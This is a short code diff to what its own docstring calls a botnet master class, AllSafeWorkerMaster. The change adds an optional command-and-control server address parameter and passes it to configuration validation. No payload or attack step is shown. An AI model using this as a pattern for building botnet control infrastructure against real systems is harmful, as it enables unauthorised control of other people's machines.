@@ -153,7 +153,7 @@ class AllSafeWorker(Thread):
             
 
 class AllSafeWorkerMaster():
-    def __init__(self, config_file, override=False):
+    def __init__(self, config_file, override=False, ccserver=None):
         """
         This class represents the botnet master as the thread who is in command to launch every 
         thread execution in order to fulfill botnet requiremets. It accepts a configuration file
@@ -161,10 +161,11 @@ class AllSafeWorkerMaster():
 
         @param: config_file, filename - path for the configuration file
         @param: override, boolean - optional param to set the botnet in override mode (params set by GUI)
+        @param ccserver, string - default None, C&C server remote address
         """
         # parsing the configuration file to return a configuration dictionary
         try:
-            self._configuration = validateConfigFile(config_file, override)
+            self._configuration = validateConfigFile(config_file, override, ccserver)
         except Exception:
             raise Exception("Configuration file is not properly formatted, or missing schema in /utils directory!")
         if self._configuration == None:
